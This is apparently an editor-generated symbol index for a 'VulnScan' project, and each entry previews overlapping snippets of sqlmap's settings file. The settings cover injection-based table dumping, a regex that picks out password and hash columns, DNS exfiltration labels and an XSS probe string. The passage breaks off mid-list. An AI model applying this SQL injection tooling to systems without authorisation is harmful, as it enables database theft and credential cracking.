        "peekOfCode": "HASHDB_MILESTONE_VALUE = \"OdqjeUpBLc\"  # python -c 'import random, string; print \"\".join(random.sample(string.ascii_letters, 10))'\n# Pickle protocl used for storage of serialized data inside HashDB (https://docs.python.org/3/library/pickle.html#data-stream-format)\nPICKLE_PROTOCOL = 2\n# Warn user of possible delay due to large page dump in full UNION query injections\nLARGE_OUTPUT_THRESHOLD = 1024 ** 2\n# On huge tables there is a considerable slowdown if every row retrieval requires ORDER BY (most noticable in table dumping using ERROR injections)\nSLOW_ORDER_COUNT_THRESHOLD = 10000\n# Give up on hash recognition if nothing was found in first given number of rows\nHASH_RECOGNITION_QUIT_THRESHOLD = 1000\n# Regular expression used for automatic hex conversion and hash cracking of (RAW) binary column values",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "PICKLE_PROTOCOL",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "PICKLE_PROTOCOL = 2\n# Warn user of possible delay due to large page dump in full UNION query injections\nLARGE_OUTPUT_THRESHOLD = 1024 ** 2\n# On huge tables there is a considerable slowdown if every row retrieval requires ORDER BY (most noticable in table dumping using ERROR injections)\nSLOW_ORDER_COUNT_THRESHOLD = 10000\n# Give up on hash recognition if nothing was found in first given number of rows\nHASH_RECOGNITION_QUIT_THRESHOLD = 1000\n# Regular expression used for automatic hex conversion and hash cracking of (RAW) binary column values\nHASH_BINARY_COLUMNS_REGEX = r\"(?i)pass|psw|hash\"\n# Maximum number of redirections to any single URL - this is needed because of the state that cookies introduce",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "LARGE_OUTPUT_THRESHOLD",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "LARGE_OUTPUT_THRESHOLD = 1024 ** 2\n# On huge tables there is a considerable slowdown if every row retrieval requires ORDER BY (most noticable in table dumping using ERROR injections)\nSLOW_ORDER_COUNT_THRESHOLD = 10000\n# Give up on hash recognition if nothing was found in first given number of rows\nHASH_RECOGNITION_QUIT_THRESHOLD = 1000\n# Regular expression used for automatic hex conversion and hash cracking of (RAW) binary column values\nHASH_BINARY_COLUMNS_REGEX = r\"(?i)pass|psw|hash\"\n# Maximum number of redirections to any single URL - this is needed because of the state that cookies introduce\nMAX_SINGLE_URL_REDIRECTIONS = 4\n# Maximum total number of redirections (regardless of URL) - before assuming we're in a loop",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "SLOW_ORDER_COUNT_THRESHOLD",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "SLOW_ORDER_COUNT_THRESHOLD = 10000\n# Give up on hash recognition if nothing was found in first given number of rows\nHASH_RECOGNITION_QUIT_THRESHOLD = 1000\n# Regular expression used for automatic hex conversion and hash cracking of (RAW) binary column values\nHASH_BINARY_COLUMNS_REGEX = r\"(?i)pass|psw|hash\"\n# Maximum number of redirections to any single URL - this is needed because of the state that cookies introduce\nMAX_SINGLE_URL_REDIRECTIONS = 4\n# Maximum total number of redirections (regardless of URL) - before assuming we're in a loop\nMAX_TOTAL_REDIRECTIONS = 10\n# Maximum (deliberate) delay used in page stability check",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "HASH_RECOGNITION_QUIT_THRESHOLD",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "HASH_RECOGNITION_QUIT_THRESHOLD = 1000\n# Regular expression used for automatic hex conversion and hash cracking of (RAW) binary column values\nHASH_BINARY_COLUMNS_REGEX = r\"(?i)pass|psw|hash\"\n# Maximum number of redirections to any single URL - this is needed because of the state that cookies introduce\nMAX_SINGLE_URL_REDIRECTIONS = 4\n# Maximum total number of redirections (regardless of URL) - before assuming we're in a loop\nMAX_TOTAL_REDIRECTIONS = 10\n# Maximum (deliberate) delay used in page stability check\nMAX_STABILITY_DELAY = 0.5\n# Reference: http://www.tcpipguide.com/free/t_DNSLabelsNamesandSyntaxRules.htm",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "HASH_BINARY_COLUMNS_REGEX",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "HASH_BINARY_COLUMNS_REGEX = r\"(?i)pass|psw|hash\"\n# Maximum number of redirections to any single URL - this is needed because of the state that cookies introduce\nMAX_SINGLE_URL_REDIRECTIONS = 4\n# Maximum total number of redirections (regardless of URL) - before assuming we're in a loop\nMAX_TOTAL_REDIRECTIONS = 10\n# Maximum (deliberate) delay used in page stability check\nMAX_STABILITY_DELAY = 0.5\n# Reference: http://www.tcpipguide.com/free/t_DNSLabelsNamesandSyntaxRules.htm\nMAX_DNS_LABEL = 63\n# Alphabet used for prefix and suffix strings of name resolution requests in DNS technique (excluding hexadecimal chars for not mixing with inner content)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAX_SINGLE_URL_REDIRECTIONS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "MAX_SINGLE_URL_REDIRECTIONS = 4\n# Maximum total number of redirections (regardless of URL) - before assuming we're in a loop\nMAX_TOTAL_REDIRECTIONS = 10\n# Maximum (deliberate) delay used in page stability check\nMAX_STABILITY_DELAY = 0.5\n# Reference: http://www.tcpipguide.com/free/t_DNSLabelsNamesandSyntaxRules.htm\nMAX_DNS_LABEL = 63\n# Alphabet used for prefix and suffix strings of name resolution requests in DNS technique (excluding hexadecimal chars for not mixing with inner content)\nDNS_BOUNDARIES_ALPHABET = re.sub(r\"[a-fA-F]\", \"\", string.ascii_letters)\n# Alphabet used for heuristic checks",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAX_TOTAL_REDIRECTIONS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "MAX_TOTAL_REDIRECTIONS = 10\n# Maximum (deliberate) delay used in page stability check\nMAX_STABILITY_DELAY = 0.5\n# Reference: http://www.tcpipguide.com/free/t_DNSLabelsNamesandSyntaxRules.htm\nMAX_DNS_LABEL = 63\n# Alphabet used for prefix and suffix strings of name resolution requests in DNS technique (excluding hexadecimal chars for not mixing with inner content)\nDNS_BOUNDARIES_ALPHABET = re.sub(r\"[a-fA-F]\", \"\", string.ascii_letters)\n# Alphabet used for heuristic checks\nHEURISTIC_CHECK_ALPHABET = ('\"', '\\'', ')', '(', ',', '.')\n# Minor artistic touch",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAX_STABILITY_DELAY",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "MAX_STABILITY_DELAY = 0.5\n# Reference: http://www.tcpipguide.com/free/t_DNSLabelsNamesandSyntaxRules.htm\nMAX_DNS_LABEL = 63\n# Alphabet used for prefix and suffix strings of name resolution requests in DNS technique (excluding hexadecimal chars for not mixing with inner content)\nDNS_BOUNDARIES_ALPHABET = re.sub(r\"[a-fA-F]\", \"\", string.ascii_letters)\n# Alphabet used for heuristic checks\nHEURISTIC_CHECK_ALPHABET = ('\"', '\\'', ')', '(', ',', '.')\n# Minor artistic touch\nBANNER = re.sub(r\"\\[.\\]\", lambda _: \"[\\033[01;41m%s\\033[01;49m]\" % random.sample(HEURISTIC_CHECK_ALPHABET, 1)[0], BANNER)\n# String used for dummy non-SQLi (e.g. XSS) heuristic checks of a tested parameter value",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAX_DNS_LABEL",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "MAX_DNS_LABEL = 63\n# Alphabet used for prefix and suffix strings of name resolution requests in DNS technique (excluding hexadecimal chars for not mixing with inner content)\nDNS_BOUNDARIES_ALPHABET = re.sub(r\"[a-fA-F]\", \"\", string.ascii_letters)\n# Alphabet used for heuristic checks\nHEURISTIC_CHECK_ALPHABET = ('\"', '\\'', ')', '(', ',', '.')\n# Minor artistic touch\nBANNER = re.sub(r\"\\[.\\]\", lambda _: \"[\\033[01;41m%s\\033[01;49m]\" % random.sample(HEURISTIC_CHECK_ALPHABET, 1)[0], BANNER)\n# String used for dummy non-SQLi (e.g. XSS) heuristic checks of a tested parameter value\nDUMMY_NON_SQLI_CHECK_APPENDIX = \"<'\\\">\"\n# Regular expression used for recognition of file inclusion errors",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DNS_BOUNDARIES_ALPHABET",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "DNS_BOUNDARIES_ALPHABET = re.sub(r\"[a-fA-F]\", \"\", string.ascii_letters)\n# Alphabet used for heuristic checks\nHEURISTIC_CHECK_ALPHABET = ('\"', '\\'', ')', '(', ',', '.')\n# Minor artistic touch\nBANNER = re.sub(r\"\\[.\\]\", lambda _: \"[\\033[01;41m%s\\033[01;49m]\" % random.sample(HEURISTIC_CHECK_ALPHABET, 1)[0], BANNER)\n# String used for dummy non-SQLi (e.g. XSS) heuristic checks of a tested parameter value\nDUMMY_NON_SQLI_CHECK_APPENDIX = \"<'\\\">\"\n# Regular expression used for recognition of file inclusion errors\nFI_ERROR_REGEX = r\"(?i)[^\\n]{0,100}(no such file|failed (to )?open)[^\\n]{0,100}\"\n# Length of prefix and suffix used in non-SQLI heuristic checks",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "HEURISTIC_CHECK_ALPHABET",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "HEURISTIC_CHECK_ALPHABET = ('\"', '\\'', ')', '(', ',', '.')\n# Minor artistic touch\nBANNER = re.sub(r\"\\[.\\]\", lambda _: \"[\\033[01;41m%s\\033[01;49m]\" % random.sample(HEURISTIC_CHECK_ALPHABET, 1)[0], BANNER)\n# String used for dummy non-SQLi (e.g. XSS) heuristic checks of a tested parameter value\nDUMMY_NON_SQLI_CHECK_APPENDIX = \"<'\\\">\"\n# Regular expression used for recognition of file inclusion errors\nFI_ERROR_REGEX = r\"(?i)[^\\n]{0,100}(no such file|failed (to )?open)[^\\n]{0,100}\"\n# Length of prefix and suffix used in non-SQLI heuristic checks\nNON_SQLI_CHECK_PREFIX_SUFFIX_LENGTH = 6\n# Connection read size (processing large responses in parts to avoid MemoryError crashes - e.g. large table dump in full UNION injections)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "BANNER",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "BANNER = re.sub(r\"\\[.\\]\", lambda _: \"[\\033[01;41m%s\\033[01;49m]\" % random.sample(HEURISTIC_CHECK_ALPHABET, 1)[0], BANNER)\n# String used for dummy non-SQLi (e.g. XSS) heuristic checks of a tested parameter value\nDUMMY_NON_SQLI_CHECK_APPENDIX = \"<'\\\">\"\n# Regular expression used for recognition of file inclusion errors\nFI_ERROR_REGEX = r\"(?i)[^\\n]{0,100}(no such file|failed (to )?open)[^\\n]{0,100}\"\n# Length of prefix and suffix used in non-SQLI heuristic checks\nNON_SQLI_CHECK_PREFIX_SUFFIX_LENGTH = 6\n# Connection read size (processing large responses in parts to avoid MemoryError crashes - e.g. large table dump in full UNION injections)\nMAX_CONNECTION_READ_SIZE = 10 * 1024 * 1024\n# Maximum response total page size (trimmed if larger)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "DUMMY_NON_SQLI_CHECK_APPENDIX",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "DUMMY_NON_SQLI_CHECK_APPENDIX = \"<'\\\">\"\n# Regular expression used for recognition of file inclusion errors\nFI_ERROR_REGEX = r\"(?i)[^\\n]{0,100}(no such file|failed (to )?open)[^\\n]{0,100}\"\n# Length of prefix and suffix used in non-SQLI heuristic checks\nNON_SQLI_CHECK_PREFIX_SUFFIX_LENGTH = 6\n# Connection read size (processing large responses in parts to avoid MemoryError crashes - e.g. large table dump in full UNION injections)\nMAX_CONNECTION_READ_SIZE = 10 * 1024 * 1024\n# Maximum response total page size (trimmed if larger)\nMAX_CONNECTION_TOTAL_SIZE = 100 * 1024 * 1024\n# For preventing MemoryError exceptions (caused when using large sequences in difflib.SequenceMatcher)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "FI_ERROR_REGEX",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "FI_ERROR_REGEX = r\"(?i)[^\\n]{0,100}(no such file|failed (to )?open)[^\\n]{0,100}\"\n# Length of prefix and suffix used in non-SQLI heuristic checks\nNON_SQLI_CHECK_PREFIX_SUFFIX_LENGTH = 6\n# Connection read size (processing large responses in parts to avoid MemoryError crashes - e.g. large table dump in full UNION injections)\nMAX_CONNECTION_READ_SIZE = 10 * 1024 * 1024\n# Maximum response total page size (trimmed if larger)\nMAX_CONNECTION_TOTAL_SIZE = 100 * 1024 * 1024\n# For preventing MemoryError exceptions (caused when using large sequences in difflib.SequenceMatcher)\nMAX_DIFFLIB_SEQUENCE_LENGTH = 10 * 1024 * 1024\n# Page size threshold used in heuristic checks (e.g. getHeuristicCharEncoding(), identYwaf, htmlParser, etc.)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "NON_SQLI_CHECK_PREFIX_SUFFIX_LENGTH",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "NON_SQLI_CHECK_PREFIX_SUFFIX_LENGTH = 6\n# Connection read size (processing large responses in parts to avoid MemoryError crashes - e.g. large table dump in full UNION injections)\nMAX_CONNECTION_READ_SIZE = 10 * 1024 * 1024\n# Maximum response total page size (trimmed if larger)\nMAX_CONNECTION_TOTAL_SIZE = 100 * 1024 * 1024\n# For preventing MemoryError exceptions (caused when using large sequences in difflib.SequenceMatcher)\nMAX_DIFFLIB_SEQUENCE_LENGTH = 10 * 1024 * 1024\n# Page size threshold used in heuristic checks (e.g. getHeuristicCharEncoding(), identYwaf, htmlParser, etc.)\nHEURISTIC_PAGE_SIZE_THRESHOLD = 64 * 1024\n# Maximum (multi-threaded) length of entry in bisection algorithm",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAX_CONNECTION_READ_SIZE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "MAX_CONNECTION_READ_SIZE = 10 * 1024 * 1024\n# Maximum response total page size (trimmed if larger)\nMAX_CONNECTION_TOTAL_SIZE = 100 * 1024 * 1024\n# For preventing MemoryError exceptions (caused when using large sequences in difflib.SequenceMatcher)\nMAX_DIFFLIB_SEQUENCE_LENGTH = 10 * 1024 * 1024\n# Page size threshold used in heuristic checks (e.g. getHeuristicCharEncoding(), identYwaf, htmlParser, etc.)\nHEURISTIC_PAGE_SIZE_THRESHOLD = 64 * 1024\n# Maximum (multi-threaded) length of entry in bisection algorithm\nMAX_BISECTION_LENGTH = 50 * 1024 * 1024\n# Mark used for trimming unnecessary content in large connection reads",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAX_CONNECTION_TOTAL_SIZE",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "MAX_CONNECTION_TOTAL_SIZE = 100 * 1024 * 1024\n# For preventing MemoryError exceptions (caused when using large sequences in difflib.SequenceMatcher)\nMAX_DIFFLIB_SEQUENCE_LENGTH = 10 * 1024 * 1024\n# Page size threshold used in heuristic checks (e.g. getHeuristicCharEncoding(), identYwaf, htmlParser, etc.)\nHEURISTIC_PAGE_SIZE_THRESHOLD = 64 * 1024\n# Maximum (multi-threaded) length of entry in bisection algorithm\nMAX_BISECTION_LENGTH = 50 * 1024 * 1024\n# Mark used for trimming unnecessary content in large connection reads\nLARGE_READ_TRIM_MARKER = \"__TRIMMED_CONTENT__\"\n# Generic SQL comment formation",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAX_DIFFLIB_SEQUENCE_LENGTH",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "MAX_DIFFLIB_SEQUENCE_LENGTH = 10 * 1024 * 1024\n# Page size threshold used in heuristic checks (e.g. getHeuristicCharEncoding(), identYwaf, htmlParser, etc.)\nHEURISTIC_PAGE_SIZE_THRESHOLD = 64 * 1024\n# Maximum (multi-threaded) length of entry in bisection algorithm\nMAX_BISECTION_LENGTH = 50 * 1024 * 1024\n# Mark used for trimming unnecessary content in large connection reads\nLARGE_READ_TRIM_MARKER = \"__TRIMMED_CONTENT__\"\n# Generic SQL comment formation\nGENERIC_SQL_COMMENT = \"-- [RANDSTR]\"\n# Threshold value for turning back on time auto-adjustment mechanism",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "HEURISTIC_PAGE_SIZE_THRESHOLD",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "HEURISTIC_PAGE_SIZE_THRESHOLD = 64 * 1024\n# Maximum (multi-threaded) length of entry in bisection algorithm\nMAX_BISECTION_LENGTH = 50 * 1024 * 1024\n# Mark used for trimming unnecessary content in large connection reads\nLARGE_READ_TRIM_MARKER = \"__TRIMMED_CONTENT__\"\n# Generic SQL comment formation\nGENERIC_SQL_COMMENT = \"-- [RANDSTR]\"\n# Threshold value for turning back on time auto-adjustment mechanism\nVALID_TIME_CHARS_RUN_THRESHOLD = 100\n# Check for empty columns only if table is sufficiently large",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "MAX_BISECTION_LENGTH",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "MAX_BISECTION_LENGTH = 50 * 1024 * 1024\n# Mark used for trimming unnecessary content in large connection reads\nLARGE_READ_TRIM_MARKER = \"__TRIMMED_CONTENT__\"\n# Generic SQL comment formation\nGENERIC_SQL_COMMENT = \"-- [RANDSTR]\"\n# Threshold value for turning back on time auto-adjustment mechanism\nVALID_TIME_CHARS_RUN_THRESHOLD = 100\n# Check for empty columns only if table is sufficiently large\nCHECK_ZERO_COLUMNS_THRESHOLD = 10\n# Boldify all logger messages containing these \"patterns\"",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "LARGE_READ_TRIM_MARKER",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "LARGE_READ_TRIM_MARKER = \"__TRIMMED_CONTENT__\"\n# Generic SQL comment formation\nGENERIC_SQL_COMMENT = \"-- [RANDSTR]\"\n# Threshold value for turning back on time auto-adjustment mechanism\nVALID_TIME_CHARS_RUN_THRESHOLD = 100\n# Check for empty columns only if table is sufficiently large\nCHECK_ZERO_COLUMNS_THRESHOLD = 10\n# Boldify all logger messages containing these \"patterns\"\nBOLD_PATTERNS = (\"' injectable\", \"provided empty\", \"leftover chars\", \"might be injectable\", \"' is vulnerable\", \"is not injectable\", \"does not seem to be\", \"test failed\", \"test passed\", \"live test final result\", \"test shows that\", \"the back-end DBMS is\", \"created Github\", \"blocked by the target server\", \"protection is involved\", \"CAPTCHA\", \"specific response\", \"NULL connection is supported\", \"PASSED\", \"FAILED\", \"for more than\", \"connection to \")\n# TLDs used in randomization of email-alike parameter values",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "GENERIC_SQL_COMMENT",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "GENERIC_SQL_COMMENT = \"-- [RANDSTR]\"\n# Threshold value for turning back on time auto-adjustment mechanism\nVALID_TIME_CHARS_RUN_THRESHOLD = 100\n# Check for empty columns only if table is sufficiently large\nCHECK_ZERO_COLUMNS_THRESHOLD = 10\n# Boldify all logger messages containing these \"patterns\"\nBOLD_PATTERNS = (\"' injectable\", \"provided empty\", \"leftover chars\", \"might be injectable\", \"' is vulnerable\", \"is not injectable\", \"does not seem to be\", \"test failed\", \"test passed\", \"live test final result\", \"test shows that\", \"the back-end DBMS is\", \"created Github\", \"blocked by the target server\", \"protection is involved\", \"CAPTCHA\", \"specific response\", \"NULL connection is supported\", \"PASSED\", \"FAILED\", \"for more than\", \"connection to \")\n# TLDs used in randomization of email-alike parameter values\nRANDOMIZATION_TLDS = (\"com\", \"net\", \"ru\", \"org\", \"de\", \"uk\", \"br\", \"jp\", \"cn\", \"fr\", \"it\", \"pl\", \"tv\", \"edu\", \"in\", \"ir\", \"es\", \"me\", \"info\", \"gr\", \"gov\", \"ca\", \"co\", \"se\", \"cz\", \"to\", \"vn\", \"nl\", \"cc\", \"az\", \"hu\", \"ua\", \"be\", \"no\", \"biz\", \"io\", \"ch\", \"ro\", \"sk\", \"eu\", \"us\", \"tw\", \"pt\", \"fi\", \"at\", \"lt\", \"kz\", \"cl\", \"hr\", \"pk\", \"lv\", \"la\", \"pe\", \"au\")\n# Generic www root directory names",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "VALID_TIME_CHARS_RUN_THRESHOLD",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "VALID_TIME_CHARS_RUN_THRESHOLD = 100\n# Check for empty columns only if table is sufficiently large\nCHECK_ZERO_COLUMNS_THRESHOLD = 10\n# Boldify all logger messages containing these \"patterns\"\nBOLD_PATTERNS = (\"' injectable\", \"provided empty\", \"leftover chars\", \"might be injectable\", \"' is vulnerable\", \"is not injectable\", \"does not seem to be\", \"test failed\", \"test passed\", \"live test final result\", \"test shows that\", \"the back-end DBMS is\", \"created Github\", \"blocked by the target server\", \"protection is involved\", \"CAPTCHA\", \"specific response\", \"NULL connection is supported\", \"PASSED\", \"FAILED\", \"for more than\", \"connection to \")\n# TLDs used in randomization of email-alike parameter values\nRANDOMIZATION_TLDS = (\"com\", \"net\", \"ru\", \"org\", \"de\", \"uk\", \"br\", \"jp\", \"cn\", \"fr\", \"it\", \"pl\", \"tv\", \"edu\", \"in\", \"ir\", \"es\", \"me\", \"info\", \"gr\", \"gov\", \"ca\", \"co\", \"se\", \"cz\", \"to\", \"vn\", \"nl\", \"cc\", \"az\", \"hu\", \"ua\", \"be\", \"no\", \"biz\", \"io\", \"ch\", \"ro\", \"sk\", \"eu\", \"us\", \"tw\", \"pt\", \"fi\", \"at\", \"lt\", \"kz\", \"cl\", \"hr\", \"pk\", \"lv\", \"la\", \"pe\", \"au\")\n# Generic www root directory names\nGENERIC_DOC_ROOT_DIRECTORY_NAMES = (\"htdocs\", \"httpdocs\", \"public\", \"wwwroot\", \"www\")\n# Maximum length of a help part containing switch/option name(s)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "CHECK_ZERO_COLUMNS_THRESHOLD",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "CHECK_ZERO_COLUMNS_THRESHOLD = 10\n# Boldify all logger messages containing these \"patterns\"\nBOLD_PATTERNS = (\"' injectable\", \"provided empty\", \"leftover chars\", \"might be injectable\", \"' is vulnerable\", \"is not injectable\", \"does not seem to be\", \"test failed\", \"test passed\", \"live test final result\", \"test shows that\", \"the back-end DBMS is\", \"created Github\", \"blocked by the target server\", \"protection is involved\", \"CAPTCHA\", \"specific response\", \"NULL connection is supported\", \"PASSED\", \"FAILED\", \"for more than\", \"connection to \")\n# TLDs used in randomization of email-alike parameter values\nRANDOMIZATION_TLDS = (\"com\", \"net\", \"ru\", \"org\", \"de\", \"uk\", \"br\", \"jp\", \"cn\", \"fr\", \"it\", \"pl\", \"tv\", \"edu\", \"in\", \"ir\", \"es\", \"me\", \"info\", \"gr\", \"gov\", \"ca\", \"co\", \"se\", \"cz\", \"to\", \"vn\", \"nl\", \"cc\", \"az\", \"hu\", \"ua\", \"be\", \"no\", \"biz\", \"io\", \"ch\", \"ro\", \"sk\", \"eu\", \"us\", \"tw\", \"pt\", \"fi\", \"at\", \"lt\", \"kz\", \"cl\", \"hr\", \"pk\", \"lv\", \"la\", \"pe\", \"au\")\n# Generic www root directory names\nGENERIC_DOC_ROOT_DIRECTORY_NAMES = (\"htdocs\", \"httpdocs\", \"public\", \"wwwroot\", \"www\")\n# Maximum length of a help part containing switch/option name(s)\nMAX_HELP_OPTION_LENGTH = 18\n# Maximum number of connection retries (to prevent problems with recursion)",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "BOLD_PATTERNS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "BOLD_PATTERNS = (\"' injectable\", \"provided empty\", \"leftover chars\", \"might be injectable\", \"' is vulnerable\", \"is not injectable\", \"does not seem to be\", \"test failed\", \"test passed\", \"live test final result\", \"test shows that\", \"the back-end DBMS is\", \"created Github\", \"blocked by the target server\", \"protection is involved\", \"CAPTCHA\", \"specific response\", \"NULL connection is supported\", \"PASSED\", \"FAILED\", \"for more than\", \"connection to \")\n# TLDs used in randomization of email-alike parameter values\nRANDOMIZATION_TLDS = (\"com\", \"net\", \"ru\", \"org\", \"de\", \"uk\", \"br\", \"jp\", \"cn\", \"fr\", \"it\", \"pl\", \"tv\", \"edu\", \"in\", \"ir\", \"es\", \"me\", \"info\", \"gr\", \"gov\", \"ca\", \"co\", \"se\", \"cz\", \"to\", \"vn\", \"nl\", \"cc\", \"az\", \"hu\", \"ua\", \"be\", \"no\", \"biz\", \"io\", \"ch\", \"ro\", \"sk\", \"eu\", \"us\", \"tw\", \"pt\", \"fi\", \"at\", \"lt\", \"kz\", \"cl\", \"hr\", \"pk\", \"lv\", \"la\", \"pe\", \"au\")\n# Generic www root directory names\nGENERIC_DOC_ROOT_DIRECTORY_NAMES = (\"htdocs\", \"httpdocs\", \"public\", \"wwwroot\", \"www\")\n# Maximum length of a help part containing switch/option name(s)\nMAX_HELP_OPTION_LENGTH = 18\n# Maximum number of connection retries (to prevent problems with recursion)\nMAX_CONNECT_RETRIES = 100\n# Strings for detecting formatting errors",
        "detail": "VulnScan.modules.sqlmap.lib.core.settings",
        "documentation": {}
    },
    {
        "label": "RANDOMIZATION_TLDS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.lib.core.settings",
        "description": "VulnScan.modules.sqlmap.lib.core.settings",
        "peekOfCode": "RANDOMIZATION_TLDS = (\"com\", \"net\", \"ru\", \"org\", \"de\", \"uk\", \"br\", \"jp\", \"cn\", \"fr\", \"it\", \"pl\", \"tv\", \"edu\", \"in\", \"ir\", \"es\", \"me\", \"info\", \"gr\", \"gov\", \"ca\", \"co\", \"se\", \"cz\", \"to\", \"vn\", \"nl\", \"cc\", \"az\", \"hu\", \"ua\", \"be\", \"no\", \"biz\", \"io\", \"ch\", \"ro\", \"sk\", \"eu\", \"us\", \"tw\", \"pt\", \"fi\", \"at\", \"lt\", \"kz\", \"cl\", \"hr\", \"pk\", \"lv\", \"la\", \"pe\", \"au\")\n# Generic www root directory names\nGENERIC_DOC_ROOT_DIRECTORY_NAMES = (\"htdocs\", \"httpdocs\", \"public\", \"wwwroot\", \"www\")\n# Maximum length of a help part containing switch/option name(s)\nMAX_HELP_OPTION_LENGTH = 18\n# Maximum number of connection retries (to prevent problems with recursion)\nMAX_CONNECT_RETRIES = 100\n# Strings for detecting formatting errors\nFORMAT_EXCEPTION_STRINGS = (\"Type mismatch\", \"Error converting\", \"Please enter a\", 